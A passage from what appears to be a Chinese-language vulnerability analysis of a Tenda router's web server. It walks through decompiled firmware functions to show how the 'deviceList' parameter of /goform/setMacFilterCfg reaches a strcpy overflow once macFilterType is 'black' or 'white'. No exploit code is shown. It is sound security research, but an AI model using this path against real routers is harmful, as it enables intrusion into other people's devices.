v16; <span class="hljs-comment">// [sp+4Ch] [bp-1E0h]</span><br>  <span class="hljs-type">int</span> v17; <span class="hljs-comment">// [sp+50h] [bp-1DCh]</span><br>  <span class="hljs-type">int</span> v18; <span class="hljs-comment">// [sp+54h] [bp-1D8h]</span><br>  <span class="hljs-type">int</span> v19; <span class="hljs-comment">// [sp+58h] [bp-1D4h]</span><br>  <span class="hljs-type">int</span> s2; <span class="hljs-comment">// [sp+5Ch] [bp-1D0h]</span><br>  <span class="hljs-type">int</span> v21; <span class="hljs-comment">// [sp+60h] [bp-1CCh]</span><br>  <span class="hljs-type">int</span> v22; <span class="hljs-comment">// [sp+64h] [bp-1C8h]</span><br>  <span class="hljs-type">int</span> v23; <span class="hljs-comment">// [sp+68h] [bp-1C4h]</span><br>  <span class="hljs-type">char</span> v24; <span class="hljs-comment">// [sp+6Ch] [bp-1C0h]</span><br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [sp+ECh] [bp-140h]</span><br>  <span class="hljs-type">int</span> v26; <span class="hljs-comment">// [sp+1ECh] [bp-40h]</span><br>  <span class="hljs-type">int</span> v27; <span class="hljs-comment">// [sp+1F0h] [bp-3Ch]</span><br>  <span class="hljs-type">int</span> v28; <span class="hljs-comment">// [sp+1F4h] [bp-38h]</span><br>  <span class="hljs-type">int</span> v29; <span class="hljs-comment">// [sp+1F8h] [bp-34h]</span><br>  <span class="hljs-type">int</span> v30; <span class="hljs-comment">// [sp+1FCh] [bp-30h]</span><br>  <span class="hljs-type">int</span> v31; <span class="hljs-comment">// [sp+200h] [bp-2Ch]</span><br>  <span class="hljs-type">int</span> v32; <span class="hljs-comment">// [sp+204h] [bp-28h]</span><br>  <span class="hljs-type">int</span> v33; <span class="hljs-comment">// [sp+208h] [bp-24h]</span><br>  <span class="hljs-type">char</span> v34; <span class="hljs-comment">// [sp+20Fh] [bp-1Dh]</span><br>  <span class="hljs-type">char</span> v35; <span class="hljs-comment">// [sp+210h] [bp-1Ch]</span><br>  <span class="hljs-type">char</span> v36; <span class="hljs-comment">// [sp+211h] [bp-1Bh]</span><br>  <span class="hljs-type">char</span> v37; <span class="hljs-comment">// [sp+212h] [bp-1Ah]</span><br>  <span class="hljs-type">char</span> v38; <span class="hljs-comment">// [sp+213h] [bp-19h]</span><br>  <span class="hljs-type">char</span> *vul_str; <span class="hljs-comment">// [sp+214h] [bp-18h]</span><br>  <span class="hljs-type">void</span> *v40; <span class="hljs-comment">// [sp+218h] [bp-14h]</span><br>  <span class="hljs-type">int</span> v41; <span class="hljs-comment">// [sp+21Ch] [bp-10h]</span><br><br>  v3 = a1;<br>  v40 = <span class="hljs-number">0</span>;<br>  vul_str = <span class="hljs-number">0</span>;<br>  v41 = <span class="hljs-number">0</span>;<br>  v26 = <span class="hljs-number">0</span>;<br>  v27 = <span class="hljs-number">0</span>;<br>  v28 = <span class="hljs-number">0</span>;<br>  v29 = <span class="hljs-number">0</span>;<br>  v30 = <span class="hljs-number">0</span>;<br>  v31 = <span class="hljs-number">0</span>;<br>  v32 = <span class="hljs-number">0</span>;<br>  v33 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>u);<br>  <span class="hljs-built_in">memset</span>(&amp;v24, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>u);<br>  v40 = sub_2B794(v3, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;macFilterType&quot;</span>, (<span class="hljs-type">int</span>)&amp;unk_F0BA4);<br>  v41 = sub_BD34C(v40); <span class="hljs-comment">// 调用判断函数</span><br>  <span class="hljs-keyword">if</span> ( v41 ) <span class="hljs-comment">// 判断v41</span><br>  &#123;<br>    s2 = <span class="hljs-number">0</span>;<br>    v21 = <span class="hljs-number">0</span>;<br>    v22 = <span class="hljs-number">0</span>;<br>    v23 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( GetValue(<span class="hljs-string">&quot;cgi_debug&quot;</span>, &amp;s2) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;on&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;s2) )<br>    &#123;<br>      v38 = <span class="hljs-number">2</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[%s:%s:%d] %s&quot;</span>, off_FCFEC[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;formSetMacFilterCfg&quot;</span>, <span class="hljs-number">500</span>, off_FCFE8[<span class="hljs-number">0</span>]);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;set mac filter mode error!\n\x1B[0m&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    vul_str = (<span class="hljs-type">char</span> *)sub_2B794(v3, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;deviceList&quot;</span>, (<span class="hljs-type">int</span>)&amp;unk_F0BA4);<br>    v41 = vul_3((<span class="hljs-type">int</span>)v40, vul_str);             <span class="hljs-comment">// 漏洞调用点</span><br>    <span class="hljs-keyword">if</span> ( v41 )<br>    &#123;<br>      v16 = <span class="hljs-number">0</span>;<br>      v17 = <span class="hljs-number">0</span>;<br>      v18 = <span class="hljs-number">0</span>;<br>      v19 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( GetValue(<span class="hljs-string">&quot;cgi_debug&quot;</span>, &amp;v16) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;on&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v16) )<br>      &#123;<br>        v37 = <span class="hljs-number">2</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[%s:%s:%d] %s&quot;</span>, off_FCFEC[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;formSetMacFilterCfg&quot;</span>, <span class="hljs-number">508</span>, off_FCFE8[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;set mac filter rules error!\n\x1B[0m&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      sub_C3E80();<br>      v1 = sub_BED1C(v40);<br>      <span class="hljs-keyword">if</span> ( CommitCfm(v1) )<br>      &#123;<br>        send_msg_to_netctrl(<span class="hljs-number">9</span>, <span class="hljs-string">&quot;op=5&quot;</span>);<br>        GetValue(<span class="hljs-string">&quot;wl2g.public.enable&quot;</span>, &amp;v26);<br>        <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;1&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v26) )<br>        &#123;<br>          v8 = <span class="hljs-number">0</span>;<br>          v9 = <span class="hljs-number">0</span>;<br>          v10 = <span class="hljs-number">0</span>;<br>          v11 = <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">if</span> ( GetValue(<span class="hljs-string">&quot;cgi_debug&quot;</span>, &amp;v8) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;on&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v8) )<br>          &#123;<br>            v35 = <span class="hljs-number">1</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[%s:%s:%d] %s&quot;</span>, off_FCFEC[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;formSetMacFilterCfg&quot;</span>, <span class="hljs-number">528</span>, off_FCFE4[<span class="hljs-number">0</span>]);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2.4G is enabled, sending msg to 2.4G wifi refresh!\n\x1B[0m&quot;</span>);<br>          &#125;<br>          <span class="hljs-built_in">snprintf</span>(&amp;v24, <span class="hljs-number">0x80</span>u, <span class="hljs-string">&quot;op=%d,wl_rate=%d&quot;</span>, <span class="hljs-number">11</span>, <span class="hljs-number">24</span>);<br>          send_msg_to_netctrl(<span class="hljs-number">19</span>, &amp;v24);<br>        &#125;<br>        GetValue(<span class="hljs-string">&quot;wl5g.public.enable&quot;</span>, &amp;v26);<br>        <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;1&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v26) )<br>        &#123;<br>          v4 = <span class="hljs-number">0</span>;<br>          v5 = <span class="hljs-number">0</span>;<br>          v6 = <span class="hljs-number">0</span>;<br>          v7 = <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">if</span> ( GetValue(<span class="hljs-string">&quot;cgi_debug&quot;</span>, &amp;v4) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;on&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v4) )<br>          &#123;<br>            v34 = <span class="hljs-number">1</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[%s:%s:%d] %s&quot;</span>, off_FCFEC[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;formSetMacFilterCfg&quot;</span>, <span class="hljs-number">535</span>, off_FCFE4[<span class="hljs-number">0</span>]);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5G is enabled, sending msg to 5G wifi refresh!\n\x1B[0m&quot;</span>);<br>          &#125;<br>          <span class="hljs-built_in">snprintf</span>(&amp;v24, <span class="hljs-number">0x80</span>u, <span class="hljs-string">&quot;op=%d,wl_rate=%d&quot;</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>);<br>          send_msg_to_netctrl(<span class="hljs-number">19</span>, &amp;v24);<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v12 = <span class="hljs-number">0</span>;<br>        v13 = <span class="hljs-number">0</span>;<br>        v14 = <span class="hljs-number">0</span>;<br>        v15 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> ( GetValue(<span class="hljs-string">&quot;cgi_debug&quot;</span>, &amp;v12) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;on&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v12) )<br>        &#123;<br>          v36 = <span class="hljs-number">2</span>;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[%s:%s:%d] %s&quot;</span>, off_FCFEC[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;formSetMacFilterCfg&quot;</span>, <span class="hljs-number">519</span>, off_FCFE8[<span class="hljs-number">0</span>]);<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cfm commit error!\n\x1B[0m&quot;</span>);<br>        &#125;<br>        v41 = <span class="hljs-number">1</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">snprintf</span>(&amp;s, <span class="hljs-number">0x100</span>u, <span class="hljs-string">&quot;&#123;\&quot;errCode\&quot;:%d&#125;&quot;</span>, v41);<br>  <span class="hljs-keyword">return</span> sub_9C66C(v3, &amp;s);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>进入目标分支后，再从deviceList获取传入v39变量，根据上一节的分析该值将被用作strcpy的参数。</p>
<p>然而这里有个判断，要想执行到前面我们所跟踪到的内容，必须先绕过一个if判断，也就是我们必须要得使v41这个变量值为0，然而该值是调用sub_BD34C函数的一个返回值，咱们先跟进sub_BD34C函数看看。</p>
<h3 id="sub-BD34C"><a href="#sub-BD34C" class="headerlink" title="sub_BD34C"></a>sub_BD34C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">signed</span> <span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">sub_BD34C</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// r3</span><br>  <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// [sp+Ch] [bp-48h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [sp+10h] [bp-44h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [sp+14h] [bp-40h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [sp+18h] [bp-3Ch]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [sp+1Ch] [bp-38h]</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [sp+20h] [bp-34h]</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [sp+24h] [bp-30h]</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [sp+28h] [bp-2Ch]</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [sp+2Ch] [bp-28h]</span><br>  <span class="hljs-type">int</span> s2; <span class="hljs-comment">// [sp+30h] [bp-24h]</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// [sp+34h] [bp-20h]</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// [sp+38h] [bp-1Ch]</span><br>  <span class="hljs-type">int</span> v15; <span class="hljs-comment">// [sp+3Ch] [bp-18h]</span><br>  <span class="hljs-type">char</span> v16; <span class="hljs-comment">// [sp+41h] [bp-13h]</span><br>  <span class="hljs-type">char</span> v17; <span class="hljs-comment">// [sp+42h] [bp-12h]</span><br>  <span class="hljs-type">char</span> v18; <span class="hljs-comment">// [sp+43h] [bp-11h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v19; <span class="hljs-comment">// [sp+44h] [bp-10h]</span><br><br>  v3 = a1;<br>  v19 = <span class="hljs-number">0</span>;<br>  s2 = <span class="hljs-number">0</span>;<br>  v13 = <span class="hljs-number">0</span>;<br>  v14 = <span class="hljs-number">0</span>;<br>  v15 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( GetValue(<span class="hljs-string">&quot;cgi_debug&quot;</span>, &amp;s2) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;on&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;s2) )<br>  &#123;<br>    v18 = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[%s:%s:%d] %s&quot;</span>, off_FCFEC[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;set_macfilter_mode&quot;</span>, <span class="hljs-number">566</span>, off_FCFE4[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;get mac filter mode == %s\n\x1B[0m&quot;</span>, v3);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *v3 )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;black&quot;</span>, v3) || !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;white&quot;</span>, v3) ) <span class="hljs-comment">// 参数字符串判断</span><br>    &#123;<br>      SetValue(<span class="hljs-string">&quot;macfilter.mode&quot;</span>, v3);<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;black&quot;</span>, v3) )<br>        v19 = <span class="hljs-string">&quot;deny&quot;</span>;<br>      <span class="hljs-keyword">else</span><br>        v19 = <span class="hljs-string">&quot;allow&quot;</span>;<br>      SetValue(<span class="hljs-string">&quot;wl2g.ssid0.macmode&quot;</span>, v19);<br>      SetValue(<span class="hljs-string">&quot;wl5g.ssid0.macmode&quot;</span>, v19);<br>      v1 = <span class="hljs-number">0</span>; <span class="hljs-comment">//设置返回值为0</span><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v4 = <span class="hljs-number">0</span>;<br>      v5 = <span class="hljs-number">0</span>;<br>      v6 = <span class="hljs-number">0</span>;<br>      v7 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( GetValue(<span class="hljs-string">&quot;cgi_debug&quot;</span>, &amp;v4) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;on&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v4) )<br>      &#123;<br>        v16 = <span class="hljs-number">2</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[%s:%s:%d] %s&quot;</span>, off_FCFEC[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;set_macfilter_mode&quot;</span>, <span class="hljs-number">575</span>, off_FCFE8[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;got wrong mac filter mode: %s!\n\x1B[0m&quot;</span>, v3);<br>      &#125;<br>      v1 = <span class="hljs-number">2</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v8 = <span class="hljs-number">0</span>;<br>    v9 = <span class="hljs-number">0</span>;<br>    v10 = <span class="hljs-number">0</span>;<br>    v11 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( GetValue(<span class="hljs-string">&quot;cgi_debug&quot;</span>, &amp;v8) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;on&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v8) )<br>    &#123;<br>      v17 = <span class="hljs-number">2</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[%s:%s:%d] %s&quot;</span>, off_FCFEC[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;set_macfilter_mode&quot;</span>, <span class="hljs-number">569</span>, off_FCFE8[<span class="hljs-number">0</span>]);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;got mac filter mode failed!\n\x1B[0m&quot;</span>);<br>    &#125;<br>    v1 = <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v1;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>以上逻辑是，根据传入的参数来进行字符串判断，若传入参数字符串为<code>black</code>或者<code>white</code>就会使返回值为0，那么就可以执行到漏洞点。</p>
<p>然而sub_2B794函数是解析字符串返回对应的字符串，类似与json解析，根据key值找value。</p>
<h3 id="sub-2B794"><a href="#sub-2B794" class="headerlink" title="sub_2B794"></a>sub_2B794</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__fastcall <span class="hljs-title function_">sub_2B794</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [sp+4h] [bp-20h]</span><br>  _DWORD *v6; <span class="hljs-comment">// [sp+14h] [bp-10h]</span><br><br>  v5 = a3;<br>  v6 = sub_1F8FC(*(_DWORD *)(a1 + <span class="hljs-number">32</span>), (<span class="hljs-type">char</span> *)a2);<br>  <span class="hljs-keyword">if</span> ( !v6 )<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)v5;<br>  <span class="hljs-keyword">if</span> ( (*((<span class="hljs-type">unsigned</span> __int16 *)v6 + <span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-number">16</span>) | *((<span class="hljs-type">unsigned</span> __int16 *)v6 + <span class="hljs-number">9</span>) )<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)((*((<span class="hljs-type">unsigned</span> __int16 *)v6 + <span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-number">16</span>) | *((<span class="hljs-type">unsigned</span> __int16 *)v6 + <span class="hljs-number">9</span>));<br>  <span class="hljs-keyword">return</span> &amp;unk_D8440;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>那么什么函数会调用formSetMacFilterCfg函数呢?继续跟踪调用函数。</p>
<h3 id="sub-41F18"><a href="#sub-41F18" class="headerlink" title="sub_41F18"></a>sub_41F18</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_41F18</span><span class="hljs-params">()</span> <br>&#123;<br>...<br>sub_16EF4(<span class="hljs-string">&quot;AdvSetNat&quot;</span>, formNatSet);<br>sub_FE28(<span class="hljs-string">&quot;NatSet&quot;</span>, aspNatSet);<br>sub_16EF4(<span class="hljs-string">&quot;getMacFilterCfg&quot;</span>, formGetMacFilterCfg);<br>sub_16EF4(<span class="hljs-string">&quot;setMacFilterCfg&quot;</span>, formSetMacFilterCfg);<br>sub_16EF4(<span class="hljs-string">&quot;parentControlEn&quot;</span>, formSetParentControlEnable);<br>...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>好像没发现啥，继续往上跟踪</p>
<h3 id="sub-2E6F4"><a href="#sub-2E6F4" class="headerlink" title="sub_2E6F4"></a>sub_2E6F4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">signed</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sub_2E6F4</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// r0</span><br>  <span class="hljs-type">size_t</span> v1; <span class="hljs-comment">// r3</span><br>  <span class="hljs-type">size_t</span> v2; <span class="hljs-comment">// r3</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// r3</span><br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [sp+8h] [bp-194h]</span><br>  <span class="hljs-type">char</span> dest; <span class="hljs-comment">// [sp+88h] [bp-114h]</span><br>  <span class="hljs-type">char</span> v7; <span class="hljs-comment">// [sp+108h] [bp-94h]</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">inp</span>;</span> <span class="hljs-comment">// [sp+188h] [bp-14h]</span><br>  <span class="hljs-type">char</span> *v9; <span class="hljs-comment">// [sp+18Ch] [bp-10h]</span><br><br>  v9 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>u);<br>  v0 = doSystemCmd(<span class="hljs-string">&quot;echo 0 &gt; /proc/sys/net/ipv4/tcp_timestamps&quot;</span>);<br>  sub_1B3DC(v0);<br>  inet_aton((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;g_lan_ip, &amp;inp);<br>  <span class="hljs-built_in">strcpy</span>(&amp;dest, off_FB76C);<br>  sub_12238(&amp;dest);<br>  v9 = inet_ntoa(inp);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(v9) + <span class="hljs-number">1</span> &gt; <span class="hljs-number">0x7F</span> )<br>    v1 = <span class="hljs-number">128</span>;<br>  <span class="hljs-keyword">else</span><br>    v1 = <span class="hljs-built_in">strlen</span>(v9) + <span class="hljs-number">1</span>;<br>  sub_19354(&amp;s, v9, v1);<br>  sub_2CF20(&amp;s);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(&amp;v7) + <span class="hljs-number">1</span> &gt; <span class="hljs-number">0x7F</span> )<br>    v2 = <span class="hljs-number">128</span>;<br>  <span class="hljs-keyword">else</span><br>    v2 = <span class="hljs-built_in">strlen</span>(&amp;v7) + <span class="hljs-number">1</span>;<br>  sub_19354(&amp;s, &amp;v7, v2);<br>  sub_2CE84(&amp;s);<br>  sub_121D0(<span class="hljs-string">&quot;main.html&quot;</span>);<br>  sub_1F268(off_FB770);<br>  <span class="hljs-keyword">if</span> ( sub_29218(port, retries) &gt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    sub_176B0(&amp;unk_D8894, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, R7WebsSecurityHandler, <span class="hljs-number">1</span>);<br>    sub_176B0(<span class="hljs-string">&quot;/goform&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, websFormHandler, <span class="hljs-number">0</span>);<br>    sub_176B0(<span class="hljs-string">&quot;/cgi-bin&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, webs_Tenda_CGI_BIN_Handler, <span class="hljs-number">0</span>);<br>    sub_176B0(&amp;unk_D8894, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, websDefaultHandler, <span class="hljs-number">2</span>);<br>    sub_41F18(); <span class="hljs-comment">// call vul hunc</span><br>    sub_176B0(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, sub_2E9D8, <span class="hljs-number">0</span>);<br>    v3 = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %d: websOpenServer failed\n&quot;</span>, <span class="hljs-string">&quot;initWebs&quot;</span>, <span class="hljs-number">499</span>);<br>    v3 = <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v3;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>通过gdb下断点确定访问“&#x2F;goform&#x2F;setMacFilterCfg”时会进入formSetMacfiltercfg函数。</p>
<p>再继续网上跟踪就是必须运行的代码块了，如下。</p>
